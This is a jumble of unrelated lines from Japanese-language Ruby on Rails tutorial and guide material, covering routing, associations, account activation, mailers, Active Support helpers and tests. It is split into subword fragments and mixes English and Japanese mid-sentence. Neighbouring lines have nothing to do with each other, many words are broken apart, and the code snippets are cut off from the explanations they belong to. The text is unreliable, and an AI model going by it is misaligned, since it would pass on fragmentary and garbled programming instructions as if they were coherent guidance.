▁ ちなみに 、\ k ode { rails ▁generate } コマンドを実行 することで コントローラ ー ごとに 分 け られた CSS ファイル が自動的に 生成されます が 、 これらの ファイルを 正しい 順序 で 読み 込 ま せる のは 至 難 の 技 なので 、 本チュートリアル では ▁( 簡潔 のために ) ▁ すべての CSS を 1 つ に まとめ る 方 針 を 採 っています 。
▁% w ( a ▁b ▁c ▁d )▖ f if th ▁# ▁=> ▁nil
▁これ を修正する には 、` get ` 行 を ` re s or ce s ` 行 ▁** よりも 上 ** ▁ の 行 に移動し てください ▟ これにより 、` get ` 行 が マッチする ようになります 。
▁" Admin :: H o t el :: Re serv ation Util s "▖ deconstantize ▁# ▁=> ▁" Admin :: H o t el "
▁"#{ id } - # { name ▖ parameterize } "
▁上のコード で 、 require の パス にある \ k ode { ’ ▖ ’} は 、 Unix の ▁“ カレント ディレクトリ ” ▁( 現在の ディレクトリ ) ▁ を表し 、\ k ode { ’ ▖ / example \_ user ’} という パス は 、 カレント ディレクトリ からの 相 対 パス で example \_ user ファイルを 探 す ように Ruby に 指示 します 。
▁ ActionController :: TestCase ▖ class _ eval ▁do
▁ 先 に進む前に 、 サンプル データ と フィクスチャ も 更新 し 、 テスト 時の サンプル と ユーザー を事前に 有効化 しておきましょう ▁( リスト \ ref { code : seed _ users _ activated } と リスト \ ref { code : fixture _ users _ activated }) 。
▁### ▁ ビュー をオーバーライドする
▁has _ many ▁: orders , ▁before _ add : ▁: check _ credit _ limit
▁\ k ode { provide } 関数 は content _ for の 代 替 です 。
▁#### ▁JRuby プラットフォーム で MySQL データベース を使用する
▁\ k ode { content \_ tag } を使って レイアウト の中に \ k ode { flash } を 埋 め 込 む
▁続いて 、 リスト \ ref { code : new _ readme } の内容を \ k ode { README ▖ md } に 入力 します 。
▁User メイラー 内の 呼び出し では 、\ k ode {@ user } が \ k ode { self } に 変更 されている 点 にも ご 注 目 ください 。
▁ マイクロポストの \ emph { マ イ ク ロ } という 名前 に ふ さ わ しく 、 何らかの 方法で 文字 数 制限 を与え てみましょう 。
▁ 特定の 条件 では バリデーション を行なう ▁** べ き でない ** ▁ 場合は 、`: unless ` オプション を使用します 。
▁README ▖ rdoc
▁次に 、 ログイン に成功した場合 ▁(\ ref { sec : logging _ in }) ▁ に使用する 土台 部分 を作成します ▟ ここでは 、 ログイン が 送信される たびに 、 パスワード と メールアドレス の 組み合わせ が 有効 かどうかを 判 定 します 。
▁ これらは 同様に 動作します 。
▁ すぐ 削除され るので 事 実 上 意味 の ない Relationship オブジェクトを わざわざ 作成 すること による オ ー バー ヘ ッ ド を 回 避 するために 、\ k ode { delete } テストでは 名前付きルート に id ▁\ k ode {1} を ハ ー ド コード して あります 。
▁NOTE : ▁ 前述の とおり 、 コード に パッチ を 当 て る 際に は 、 ドキュメント も それ に 対応 して 適切に 書かれ る必要があります 。
▁\ label { fig : user _ microposts _ mockup } }╼\ end { figure }╼╼ ▁\ subsection { マイクロポストの 描画 } ▁% ▁( fold )╼ ▁\ label { sec : render ing _ microposts }╼╼ O ur ▁plan ▁is ▁to ▁display ▁the
▁なお 、 以上 は 説明 のための コード であり 、 実際に SQL 文字列 に 挿入する ときは 、 この よう に記述 する必要はありません ▟ 実は 、\ k ode { ?} を 内 挿 すると 自動的に この 辺 り の 面倒 を見 て く れ ます ▟ さらに 、 データベース に依存する 一部の 非 互換性 まで 解 消 してくれます 。
▁ この節 の内容は 先 進 的 ですが 、 その 分 、 本書 の 他の 内容 よりも 陳腐 化 し やすい ので 、 ご 利用 の システム で この節 の例 が 完全に 動作する とは限りません ▟ この 点を ご 了 承 願 います ▟ 完全に 動作 させる には 、 Google で 最新 情報を 検索 して 調 べ ること が必要になる でしょう 。
▁ 計算
▁ 与えられた 文字列 に ` html _ safe ` メソッド を適用する ことで 、 安全 な 文字列 を得る ことができます 。
▁これらの JSON ▁gem ▁are ▁mean t ▁for ▁serializ ing ▁and ▁ de s er ia li z ing ▁arbitrar y ▁Ruby ▁objects ▁and ▁are ▁generally ▁[ un safe ] API は 任意の Ruby オブジェクトを シリアライズ および デ シリアライズ するための もの であり 、 一般に [ 安全 ではありません ]( http :// www ▖ ruby - doc ▖ org / s td lib - 2▖0▖ 0 / lib doc / json / rdoc / JSON ▖ html # method - i - load ) 。
▁password _ field (: login , ▁: pass )
▁( scaffold で 自動生成 される コードは 冗 長 で 紛 ら わ しい ので 除 いて あります ) 。
▁' ssl _ error ' ▖ humanize ▁# ▁=> ▁" SSL ▁error "
▁この コールバック がある ことで 、( リスト \ ref { code : create _ action _ strong _ parameters } で ユーザー登録 を 行った ときに ) \ k ode { User ▖ new } で 新しい ユーザーが 定義され ると 、\ k ode { activation \_ token } 属性 や \ k ode { activation \_ digest } 属性 を自動的に 得られます ▟ 後者の activation _ digest 属性 は既に データベースの カラム と の関連付け が でき あ が っている ▁( 図 \ ref { fig : user _ model _ account _ activation }) ▁ ので 、 ユーザーが 保存 される ときに 一 緒 に 自動 保存されます 。
▁headers [" X - SMTP API - C A TE G O RY "] ▁= ▁@ business ▖ code
▁ キー が 重複 している場合 、 いずれ か の 値が 優 先 されます 。
▁def ▁self ▖ deliver ing _ email ( message )
▁ これはリスト \ ref { code : home _ page _ passing } で使用されていました 。
▁WARNING : ▁ どんな クラス でも 、` dup ` メソッドと ` clone ` メソッドを 除 去 することで これらの メソッドを 無効 に してしまう ことができます ▟ このとき 、 これらの メソッドが 実行される と 例外が発生します 。
▁- 2 1 ▖ ordinal ▁# ▁=> ▁" st "
▁その 代わりに 、 この 作業 に必要な データ ▁( 有効化トークン や 有効化 ステータス など ) ▁ を User モデル に追加する ことにします 。
▁ 重複 する メールアドレス 拒 否 のテスト ▁( ▁\ failing ▁ ) ▁ { 5 }{/ 5 } { 6 } test / models / user _ test ▖ rb { / 6 }
▁S trong ▁Parameters を使用することで 、\ emph { 必 須 } の パラメータ と \ emph { 許可 された } パラメータ を指定することができます 。
▁ 同じ 日 が 行 き 先 の 月 に ない場合 、 その 月 の 最後の 日 が返されます 。
▁ この章 の 終わり まで に 、 最後の リンクを 除 き 全て 実装します 。
▁* ▁ 動的な メソッドは 、` find _ by _▖▖▖` と ` find _ by _ ▖▖▖ !` を除いて 非推奨 となり ました 。
▁ このような 場合 を サポート するために 、 Active ▁Support では ` config / initializers / inflections ▖ rb ` の 頭 字 語 を指定することができます 。
▁` has _ one ` 関連付け に オブジェクトを ア サ イン すると 、 外部キー を更新する ために そのオブジェクト は自動的に 保存されます 。
▁HTTP /1▖1 ▁200 ▁OK ▁ Server : ▁Co w bo y
▁### ▁ 他の gem と の 依存関係
▁ フィールド に どのような 値 がある か を 問い合わせ る の に 使用される 、 特定の モデルオブジェクト の 外 側 に フォーム を 1 つ と スコープ を 1 つ 作成します 。
▁flash [: not ice ] ▁= ▁" Comment ▁has ▁been ▁created !"
▁class ▁E s s a y ▁< ▁ActiveRecord :: Base
▁これにより 、 キー の内容 によって 異 な った CSS クラスを 適用 させる ことができ 、 メッセージ の種類 によって スタイル を 動的 に 変更 させる ことができます 。
▁resources ▁: users , ▁do
▁### ▁ 最大 値
▁ 足 跡 を ほぼ 残 さ ないようにする ため 、 Active ▁Support はデフォルトで は 何も 読み込み ません 。
▁上 で説明した ことを User モデルに 実装 すると リスト \ ref { code : user _ model _ activation _ code } のようになります 。
▁最後に 、2 つの 機能を 完全に 連 携 させ ます ▟ パスワードを 再設定 すると 、 パスワード 再設定 用の リンク が メール で 送信 され 、 その 宛 先 メールアドレスが 有効 であること は 最初の アカウント有効化 で 確 認 済み である 、 といった 具 合 です
▁#### ▁` reverse _ merge ` と ` reverse _ merge !
▁ 上で 実際に 使用される SQL 文 は以下のようになります 。
▁ と 書く と うまく 動きません 。
▁\ chapter { ユーザーの モデル を作成する } ▁% ▁( fold )╼\ label { cha : modeling _ users }╼╼
▁ この章 には 多くの 話 題 が 盛 り 込 まれ ています が 、 一度 読 んだ だけで 理解 する 必要 は まったく ありません 。
▁上の エラー が発生する ような 場合は 、` database ▖ yml ` の ` po ol ` オプション の 数値 を 増 や して 接続 プール の サイズ を 増 や す ことで 対応 できます 。
▁このメソッドは 、`: attribute ` の すべての エラー の配列 を返します 。
▁* ▁` assets : precompile : primary ` および ` assets : precompile : all ` は 削除 されました 。
▁ユーザー から リクエスト された URL を Users リソース で使用する コントローラのアクション に 割り当て る ▁( マッピング する ) ▁ コードは 、 リスト \ ref { code : rails _ routes } のような 感じ になります ▟ このコード は Rails の ルーター 設定ファイル ▁( config / routes ▖ rb ) ▁ の 中 で使用され 、 URL と アクション の 組み合わせ ▁( 表 \ ref { table : user _ url s }) ▁ を 効率 よく 設定 することができます
▁リスト \ ref { code : user _ model _ remember } では 、 明示的に \ k ode { User } を プレフィックス として 、 新しい トークン や ダイジェスト の クラスメソッド を定義し ました 。
▁before フィルター を使って 、 認可 ▁( アクセス制御 ) ▁ を 実現 した
▁ このため 、\ k ode { log _ in _ as } では テスト の種類 を 検出 して 、 それ に応じた ログイン を 行えるように する必要があります 。
▁もちろん 、 映 画 「\ href { http :// www ▖ im db ▖ com / title / tt 04 99 5 4 9 /}{ ア バ ター }」 を 見た 人 には こ ん な 解説 は 不要 でしょう 。
▁上のコードは 、 HTML の 部分 については ` my _ layout ▖ html ▖ erb ` レイアウトファイル を明示的に 使用 して レンダリング し 、 テキスト の 部分 については 通常の ` user _ mailer ▖ text ▖ erb ` があれば それ を使用して レンダリング します 。
▁たとえば 、` app / assets `、` lib / assets ` 、 または ` vendor / assets ` の下に ある ` stylesheets ` の下に ある スタイルシート ファイルに リンク したい場合は 以下のように します 。
▁# ▁=> ▁Tue , ▁09 ▁A ug ▁2011 ▁23:2 1 : 11 ▁UTC ▁+00:00
▁` resources ▁: photos ` という ルーティング を 例 に 取 って みましょう 。
▁ フォロー 一覧 も フォロワー 一覧 も 動く ようになった ので 、 この 振る舞い を検証する ための 2 つの 統合テスト を 書 い ていきましょう 。
▁5 55 123 4 ▖ to _ s (: phone )
▁ エンジン にある ` lib / blorgh ▖ rb ` に 以下の行 を追加します 。
▁> > ▁Rails ▖ env ▖ production ?
▁ ユーザーに ログイン する
▁ Cl ic k ▁on ▁the ▁link ▁below ▁to ▁activate ▁your ▁account : ╼╼ http :// rails - tutorial - c 9 - mhartl ▖ c 9 ▖ io / account _ activations / ╼ f F b _ F 9 4 m g Q t m l S v R F G s IT w / edit ?
▁ 設定 が完了し たら 、 いよいよ ユーザーログイン の コードを 書き 始 め ましょう 。
▁ これはリスト \ ref { code : delete _ destroy _ test } で使用されていました 。
▁Contact ページ のテスト ▁( ▁\ failing ▁ { 5 } { /5}) ▁ { 6 } test / controllers / static _ pages _ controller _ test ▖ rb { / 6 }
▁このとき 、 システム 環境 によって は 以下の 警 告 が 出力 される ことがあります 。
▁たとえば 、 Rails は 「 REST 」 という 設計 思 想 の 重要 性 を い ち 早く 理解 し 、 対応 した フレームワーク の 1 つ です ▁( REST については 後 ほど 解説します ) 。
▁< li >`: port ` ▁- ▁ メール サーバー が 万 一 ポート 25 番 で 動作 していない 場合は ここで 変更 する ▟ </ li >
▁ それ という の も 、 最小化 されていない CSS や JavaScript ファイルを 多数 インクルード すると 、 ページの 読み込み 時間 が 著 しく 遅 くなる からです ▁( 読み込み 時間 は 、 ユーザー 体 験 の 質 に 影 響 を与える 重要な 指 標 の 1 つ です ) 。
▁ 最後の ブロック の 例として 、 単 体 テスト にも 目 を 向 け てみましょう ▁( リスト \ ref { code : home _ base _ title _ spec }) 。
▁date ▖ beginning _ of _ minute ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 19 : 55 :00 ▁+0200 ▁2010
▁第 3 版 ▁ 目 次
▁* ▁ Turbolinks ▁gem
▁created _ at : ▁"2013-03-11 ▁20 : 45 : 19 ", ▁updated _ at : ▁"2013-03-11 ▁20 : 45 : 19 ",
▁| ▁| ▁20 1 ▁| ▁: created ▁|
▁ 多くの コンピュータ 言語 の慣習 と同様 、 Ruby の配列 でも \ emph { ゼロ オ リ ジ ン } を採用し ています ▟ これは 、 配列 の最初の 要素 の インデックス が 0 から 始 まり 、2 番目 は 1 ▖▖▖ と 続 く ことを意味します 。
▁ 検証 機能 が追加された ので 、 検証 が 通 らない 内容 を持つ @ article に対して `@ article ▖ save ` を実行すると ` false ` が 返される ようになりました 。
▁* ▁ バ ッ ク グ ラ ウ ンド での ジョブ 実行 方法
▁Using ▁Listing ▁\ ref { code : string _ shuffle _ two } ▁as ▁a ▁guide , ▁add ▁a ▁\ k ode { shuffle } ▁method ▁to ▁the ▁\ k ode { String } ▁class ▖
▁#### ▁CDN の キャッシュ の動作 を カスタマイズ する
▁ コントローラ のコード に ERB を 混 在 させる と 、 Rails の MVC 指 向 が 崩 される だけで なく 、 開発者 が プロジェクト の ロ ジ ッ ク を 追 い かけ ること が 困難 になってしまいます 。
▁# ▁=> ▁ 123 ▁5 55 ▁ 123 4
▁ 場合によっては ` has _ many ` で使用される クエリ を カスタマイズしたくなること があります 。
▁ 実は 、 Ruby ▁ では 丸 括 弧 は 使用 しても し なくても 構 いません ▟ 以下の 2 つの 行 は 同等です 。
▁最初に 、` author _ name ` テキストフィールド を エンジンの パーシャル ` app / views / blorgh / articles / _ form ▖ html ▖ erb ` に追加する 必要があります 。
▁ モデルの クラス名 が 2 語 以上の 複 合 語 である場合 、 Ruby の慣習 である キャメルケース ( CamelCase のように 語 頭 を 大文字 に して スペース なしで つ な ぐ ) に従って ください ▟ 一 方 、 テーブル名 は ( c a me l _ case など のように ) 小文字 かつ アンダースコア で 区 切 ら れ なければなりません 。
▁ 今後 Rails で 重要な 変更 が生じ ること があれば 、\ emph { Rails チュートリアル } の 版 を 改 訂 する つ も り です ▟ 新しい 版 では 、\ emph { Turbolinks }、\ emph { Russ i an ▁do ll ▁ caching } 、 RSpec ▁ の 新 機能 「\ emph { feature ▁ spec s }」 など についても 取り上げ る 予定です ▟)
▁ 正規表現 は 謎 め いて 見え る が 非常に 強 力 である
▁このコードは Rails と Ruby と SQL が 複 雑 に 絡 み 合 って いて 厄 介 ですが 、 ちゃんと 動作します 。
▁belongs _ to ▁: part
▁# ▁Time ▖ current ▖ advance ( months : ▁4 , ▁ years : ▁5 ) ▁ と 等 価
▁Rails は 、 フレームワーク の 読み込み と すべての gem の 読み込み が 終 わ って から 、 イニシャライザ の 読み込み を開始 します 。
▁#### ▁date _ select
▁ 推 奨 される 方法 が 強 調 される よう セクション の順序 に 注意 し 、 必要であれば 順序 を 入 れ 替 え ること 。
▁もちろん 、 {0}{1} リスト 3▖2 8 {/1}{/0} 、 {2}{1} リスト 3 ▖ 30 {/1}{/2} 、 ▁ {3} {1} リスト 3 ▖ 3 1 {/1} {/3} の ビュー には 、 レイアウト と 重複 する HTML が まだ 残 っている ので 、 それら を削除し て 、 内部 の コンテンツ だけ 残 します 。
▁create ▁Gemfile
▁#### ▁image _ url
▁Rails に ビルトイン されている ActionController が 行なう 暗 黙 の レンダリング では 、` render ` メソッド が呼び出され た かどうかを確認 してから レンダリング を開始 します ▟ 従って 、 以下のコード は 正常に動作し ます 。
▁Ruby ▁ を学ぶ ための ツール として 、 主 に \ emph { Rails コンソール } を使用する ことにします ▟ これは \ ref { sec : demo _ user _ has _ many _ microposts } でも 登 場 した 、 Rails アプリケーション を対話的に 操作 するための コマンドライン ツール です 。
▁` isolate _ namespace ` が呼び出され ない と 、 エンジンの ヘルパー が アプリケーションの コントローラに インクルード されてしまう 可能性があります 。
▁# ▁I gnore ▁other ▁un ne ed ed ▁files ▖
▁なお 、 Ruby 自身 のバージョン は 例外 的に バージョン に それ ほど 厳 しく ありません ▟ 本チュートリアル 内で は 、 Ruby ▁ 1▖9▖3 と Ruby ▁ 2▖0▖ 0 は 実 質 的に 同じ ように 動作する ため 、 どちら を使って も チュートリアル には 影 響 しません ▟ お 好 き な 方 を ご 使用 ください 。
▁before フィルター を使って 実装 した結果 ▁( リスト \ ref { code : authorize _ before _ filter }) ▁ は 、 一度 ログアウト して ユーザー編集ページ ▁(\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit }) ▁ にアクセス してみる ことで 確 認 できます ▁( 図 \ ref { fig : protected _ log _ in }) 。
▁デフォルトでは 英語 ▁( " en ") ▁ テンプレート が使用されます 。
▁Rails では 、 このような ハッシュの ハッシュ ▁( または \ emph { ネスト された ハッシュ }) ▁ が 大 量 に 使われ ています ▟ 実際の 使用 例 は \ ref { sec : unsuccessful _ signup s } で説明します 。
▁ これはリスト \ ref { code : sample _ microposts } で使用されていました 。
▁これは 一般に フ ロ ン ト エ ンド 開発者 コ ミ ュ ニ テ ィ で ベ スト プ ラ ク テ ィ ス である と 見 な されています が 、 ここでは もう少し 違 う 角 度 から 説明 したい と思います 。
▁ 実際 、 この時点では コントローラは Application ひとつ しか ありません ▟ 次の コマンド を実行すると 、 現在 ある コントローラ を 確 認 できます 。
▁ イニシャライザ とは 、 アプリケーションの ` config / initializers ` ディレクトリ に保存 される Ruby ファイルの ことです 。
▁この節で 参 考 まで に示した コードは それ なり に 高度な ので 、 今 すぐ 理解 できるように なる 必要はありません 。
▁#### ▁` has _ many ` の スコープ について
▁ より 柔 軟 性 の高い 方法 を使用したい場合 は 、 ブロック を 1 つ 渡 して 特定の テンプレート を レンダリング したり 、 テンプレート を使用 せずに インライン または テキスト で レンダリング することもできます 。
▁# ▁=> ▁Tue , ▁ 08 ▁Jun ▁2010 ▁00:00:00 ▁+0000
▁create ▁app / assets / stylesheets / blorgh / articles ▖ css
▁上のコード で テストを実行 してみます 。
▁ { p 0} で説明した {2} create {/2} を使います が 、 後 々 実際の ユーザーを 作成 する必要が 出 て く るので 、 今回は サ ンド ボックス 環境 は \ emph { 使い ません } ▟ したがって 、 今回 作成した ユーザー を保存する と 、 データベースに 反映され ます 。
▁` users ` テーブルに 主キー として ` id ` カラム があり 、 そ の他に ` guid ` カラム も あるとします 。
▁ただし 、 先ほど は ユーザーを 例として 扱 いました が 、 今回の ケース では フォローしているユーザー を \ k ode { follower \_ id } という 外部キー を使って 特定 し なくてはなりません ▟ また 、 follower という クラス名 は 存在しない ので 、 ここで も Rails に 正しい クラス名 を 伝える 必要 が発生し ます 。
▁<%= ▁simple _ format ( article ▖ text ) ▁%>
▁Rails は 指定 どおり コントローラ を作成し 、 関連 ファイル や ルーティング も 設定 してくれます 。
▁# ▁ 以下の行 によって ` article _ id ` という 整 数 カラム が 追加される
▁ ブランチ を 適用 したら テスト してみます 。
▁* ▁` touch `
▁次に リモート の GitHub リポジトリ と Heroku の 本番 サーバー に プッシュ します 。
▁ その他の 場合は 、\ href { http :// install rails ▖ com /}{ InstallRails ▖ com } ▁(\ ref { sec : up _ and _ running }) ▁ の 指示 に従って Git を システム に 導 入 してください 。
▁デフォルトでは 配信 が 行われます ▟ 機能 テスト など で 配信 を 一時 的に オフ に したい場合 に 便利です 。
▁( このコード のテスト は \ ref { sec : updating _ deleting _ exercises } の演習 とします ) 。
▁\ k ode { Micropost } クラスにおける継承 。
▁ 条件 文 を 2 つ 以上 含 め たい場合は 、\ k ode { el s if } ▁(\ k ode { else } ▁+ ▁\ k ode { if }) ▁という 文 を使います 。
▁ ETag は キャッシュ の 有効 性 を検証する の に 使用されます 。
▁` raw ` ヘルパーは 、 内部で ` html _ safe ` を呼び出します 。
▁ 利 便 性 のために 、` class _ attribute ` は 、 インスタンス の reader が 返す もの を 「 二 重 否 定 」 する インスタンス 述 語 も 定義 されます 。
▁* ▁` config ▖ log _ level ` は 、 Rails の ログ出力 を どの ぐらい 詳 細 に するか を指定します 。
▁user ▁= ▁User ▖ find _ by _ token ( params [: token ])
▁# ▁ユーザー 変数 を作成するための コード に置き換える 。
▁上のコード から 以下 が生成されます 。
▁ここでは ` jquery ▖ js ` と ` jquery _ ujs ▖ js ` を 必要な ファイル として 指定 しています ▟ これらの ファイルは Sprockets の 検索 パス の どこか から 読み込み 可能 になっています 。
▁リスト \ ref { code : generating _ pages } で 生成される StaticPages コントローラ
▁ これはリスト \ ref { code : micropost _ validity _ test } で使用されていました 。
▁\ k ode { full \_ title } ヘルパー を定義する
▁この ルーティング ファイルは ルーター の実装 を受け 持ち ▁( 図 \ ref { fig : mvc _ detailed }) 、 URL と Web ページの 対応 関係 を定義します 。
▁by ▁ Michael ▁Hartl
▁01 : 05 : 4 2 ", ▁updated _ at : ▁"2013-03-11 ▁01 : 05 : 4 2 ">
▁この 順序 で 計算 している ことは 、 特に 月 を 計算 する 時に 重要です 。
▁この パス は 、 マニフェストファイル からの 相 対 パス として 指定 する必要があります 。
▁ 関連する コントローラで 以下のコード を使用することで 、 コントローラ 固有の スタイルシート や JavaScript ファイルを その コントローラ だけで 使用できます 。
▁ 暗号化 した トークン だけ をデータベースに保存する 理由は 、 万 が 一 データベース が 不 正 アクセス を受け る ようなことがあ って も 、 攻撃者が 記憶トークン を使用して サインイン でき ないようにする ためです 。
▁ サインイン している ユーザー 用に リンク を変更する 。
▁このコードは リスト \ ref { code : destroy _ forget } で使用されていました ▟ もうひとつ 、
▁(\ k ode { created _ at } や \ k ode { updated _ at } など は 通常の カラム と 異なる ▁“ マ ジ ッ ク ” カラム であり 、 これらの 作成 タイムスタンプ や 更新 タイムスタンプ は自動的に 設定 されてしまう ため 、 明示的に 値を 設定 しても 上書き されてしまう ことを思い出してください ) 。
▁ できる だけ 早く アップグレード を お 願 い します 。
▁#### # ▁` collection ▖ clear `
▁{0} 表 1 2▖1 {/0} ▁{1} ユーザー と 能動的関係 の関連付け によって 使える ようになった メソッドの まとめ ▁( {/1}
▁さらに 、 サイドバー には ユーザープロファイル 画像 の リンクを 格 子 状 に 並 べ て 表示する 予定です 。
▁# ▁=> ▁< input ▁type =" text " ▁id =" login _ pass " ▁name =" login [ pass ] " ▁value ="# {@ login ▖ pass } " ▁/>
▁その 理由は 、 footer タグ と する 方が 読み 手 にとって 意味 が 明 確 である の と 、 ▖ footer クラスは Bootstrap で使用する ためです 。
▁ユーザーの フォロー解除 をテストする 。
▁ INNER ▁JOIN ▁comments ▁ ON ▁comments ▖ article _ id ▁= ▁articles ▖ id
▁ ハッシュ では シンボル を キー として 使う ことが 一般的な ので 、 Ruby ▁1▖9 では このような 特殊な 場合 のための 新しい 記 法 をサポートしてい ます 。
▁ ちなみに 、\ k ode { private } キーワード 以降 の コードを 強 調 するために 、\ k ode { user _ params } の インデント を 1 段 深 く して あります 。
▁ 現在の Action ▁Mailer では 、` mail ` メソッドを呼び出す と 2 種類の テンプレート ▁( テキスト および HTML ) ▁ がある かどうか を探し 、` multipart / alternative ` 形式 の メールを 自動生成 します 。
▁format ▖ html ▁ { ▁render ▁' another _ template ' ▁ }
▁\ k ode { log \_ in \_ as } ヘルパー を追加する
▁上のコード を使用すると 、 テストは ▁\ passing ▁ になるはずです 。
▁| ▁| ▁50 4 ▁| ▁: g ate way _ time out ▁|
▁# ▁=> ▁Ruby ▁on ▁Rails
▁ 設定 オプション の 完全な 説明 については 「 Rails アプリケーション を設定する 」 ガイド の [ Action ▁Mailer を設定する ]( configuring ▖ html # action - mailer を設定する ) を参照してください 。
▁class ▁ Library ▁< ▁ActiveRecord :: Base
▁ 準備 が でき たら 、 本番環境 へ デプロイ してみましょう 。
▁is ▁the ▁sample ▁application ▁for ▁the ▁tutorial ▖
▁ メイラー には 「 アクション 」 と呼ばれる メソッド があり 、 メールの コンテンツ を構成する の に ビュー を使用します 。
▁この 関連付け は 、2 つの モデルの 間 に 「 第 3 の モデル 」( 結合 モデル ) が 介 在 する 点が 特 徴 です ▟ それによって 、 相手 モデルの 1 つの インスタンス と マッチ します 。
▁ 一方で 、 ルート URL へのリンク は \ emph { 2 つ } ある ことを思い出してください ▁( 1 つ は ロゴ に 、 もう 1 つ は ナビゲーション バー に あります )▟ このような と k
▁リスト \ ref { code : feed _ second _ cut } で コードを 若 干 修正 し 、 フィード を リファクタリング することから始め ましょう 。
▁| ▁| ▁50 3 ▁| ▁: service _ un available ▁|
▁Guard を 初期化 し 、 RSpec と 一 緒 に 動作する ようにします 。
▁ 疑問符 ` ( ? ) ` を パラメータ で 置き換え る スタイル と同様 、 配列 による 条件 中 で キー / 値 の ハッシュ を指定できます 。
▁ アカウント有効化 は ▁Active ▁Record オブジェクト ではない が 、 セッション の場合と同様 に 、 リソース で モデル 化 できる 。
▁つまり 、 ブラウザ が CDN 上の アセットを リクエスト して キャッシュ が 見つからない 場合 、 オン デ マ ンド で サーバー から アセット ファイル を取得し て キャッシュ する という ことで
▁route ▁resources ▁: microposts
▁ 正しい モデル を見つけ 出 す 方法 の 1 つ は 、 Web アプリケーション における \ emph { following } の動作 を どのように 実装 するか を じ っ く り 考え ること です 。
▁ これはリスト \ ref { code : gravatar _ option } で使用されていました 。
▁ここでは ` articles / new ` という テンプレート がある は ず だと 言 っています 。
▁e ▖ prev ent Default ()
▁なお 、\ k ode { created _ at } カラム は 、\ ref { sec : ordering _ and _ dependency } や \ ref { sec : augment ing _ the _ user _ show _ page } の実装 を 進 めて い く 上で 必要な カラム です 。
▁ 詳細は [ ア メ リ カ 英語 と イ ギ リ ス 英語 の ス ペ ル の違い ]( http :// en ▖ w ikipedia ▖ org / wiki / A me ri can _ and _ B ri t is h _ E n g li sh _ s pe ll ing _ difference s ) ▁( 英語 ) ▁ を参照してください 。
▁get ▁' * pages ', ▁to : ▁' pages # show ', ▁format : ▁false
▁* ▁ ドキュメント に 適切な 記載 がある か 。
▁\ k ode { flash } 変数 を使うと 、 一時 的な メッセージ を表示できるように なる
▁この 機能 を使用して 、 SCSS を 以下のように 書き 直 す ことができます 。
▁` change ` メソッドを使用して 、 レシーバの 日時 の一部 の 要素 だけ を更新し た 新しい 日時 を得る ことができます ▟ 変更 する 要素 としては 、`: year `、`: month `、`: day `、`: hour `、`: m in `、`: sec `、`: offset `、`: start ` など が 指定 できます 。
▁\ k ode { person 1 }、\ k ode { person 2 }、\ k ode { person 3 } という 3 つの ハッシュ を作成してください ▟ それぞれの ハッシュ には \ k ode { : first } キー と \ k ode { : last } キー を与え 、 さらに それぞれの キー に 名前 と 名 字 を 値 として 割り当て てください 。
▁< ul >
▁\ k ode { assert _ no _ difference } と同様に 、 このメソッドは 第 一 引数に 文字列 ▁(\ k ode { ’ User ▖ count ’} ) ▁ を 取り 、\ k ode { assert _ difference } ブロック 内の 処理 を実行する 直 前 と 、 実行 した 直後 の \ k ode { User ▖ count } の 値を 比 較 します 。
▁デフォルトは ` / us r / s bin / sendmail ` です 。
▁ パス に スラッシュ ` / ` が含まれている と 、 Rails によって この ビュー は 異なる コントローラの 配 下 にある と 認 識 されます 。
▁ 今回は 、 コマンドラインで \ k ode { rspec } コマンドを実行 してみ て ましょう ▁( なお 、\ k ode { bundle ▁exec } を この コマンド の 前に 置く ことで 、\ k ode { Gemfile } 内で 定義された 環境で RSpec が 実行される ように 、 明示的に 指示 することができます { p 1 }) 。
▁Action ▁View ▁ は その後 レスポンス を 実際の Web ページに まとめ る 役 割 を 担 います 。
▁admin = 1
▁# ▁ アプリケーション への すべての アクセス を 強制的に SSL に し 、 Strict - Transport - Security と セキュア ク ッ キー を使用する
▁この サイクル の ことを 「 R ed / Green / Refactor 」 と呼びます 。
▁` collection ▖ destroy ` は 、 結合テーブル 上の レコード に対して ` destroy ` を実行する ( このとき コールバック も 実行 します ) ことで 、 コレクション から 1 つ または 複数の オブジェクトを 削除します 。
▁### ▁` has _ one ` 関連付け
▁config ▖ active _ record ▖ auto _ explain _ th re sh ol d _ in _ seconds ▁= ▁ 0▖5
▁ { a : ▁1 } ▖ with _ indifferent _ access ▖ except (" a ") ▁# ▁=> ▁ { }
▁ この節 で説明する アイディア の 多く は 、 最 初 な か な か 意図 が 読み 取 れ ないこと も ある と思います ▟ 複雑な データモデル も 、 腑 に 落 ち る まで 時間がかかる ことでしょう 。
▁ 句 読 点 や 記 号 の 用 法 は 常 識 に従う こと 。
▁これらの コードは 等 価 では あります が 、\ k ode { assert _ no _ difference } を使う 方が 明 瞭 で 、 Ruby の慣習 的に も 正しい です 。
▁Rails の ビュー には 命 名 規 則 があります 。
▁" name "▖ humanize ▁# ▁=> ▁" Name "
▁url : ▁<%= ▁ ENV [' DAT A BASE _ URL '] ▁%>
▁このメソッド の 内部で は スタイルシート へのパス 作成 に ` stylesheet _ link _ tag ` が使用されています 。
▁NOTE : ▁このメソッドは ` collection ▖ concat ` および ` collection ▖ push ` の エイリアス です 。
▁ このテストは 、 空 ではない \ k ode { user _ id } を使用して \ k ode { Micropost ▖ new } を呼ぶ と 、 mass ▁assignment ▁security ▁error 例外 が発生する ことを確認 しています 。
▁ システム 環境 によって は 、 データベースをリセットし た 後に もう一度 prepare を実行し ておく 必要 が 生じる ことがあります 。
▁この節では 、 後に 動的な ページ を作成するための 準備 として 、 最初に Rails の \ emph { アクション } と \ emph { ビュー } に 静 的な HTML だけ を含め た もの を作成します
▁ここでは 、 最初の ユーザーに ユーザー 3 から ユーザー 51 まで を フォロー させ 、 それ から 逆に ユーザー 4 から ユーザー 4 1 に 最初の ユーザーを フォロー させ ます ▟ ソース を見ると わかるように 、 このような 設定 を 自由に 行う ことができます 。
▁ プルリクエスト に 自分で コメント を追加して み ても よいでしょう 。
▁### ▁ デフォルト 設定 を定義する
▁ サンプルアプリケーション の場所は 、 たとえば 次のように 表 記 されます 。
▁図 \ ref { fig : forgot _ password _ form } の フォームから送信 を 行 な った 後 、 メールアドレスを キー として ユーザーを データベースから 見つけ 、 パスワード 再設定 用 トークン と 送信 時の タイムスタンプ で データベースの 属性 を更新する 必要があります 。
▁* ▁` collection ▖ clear `
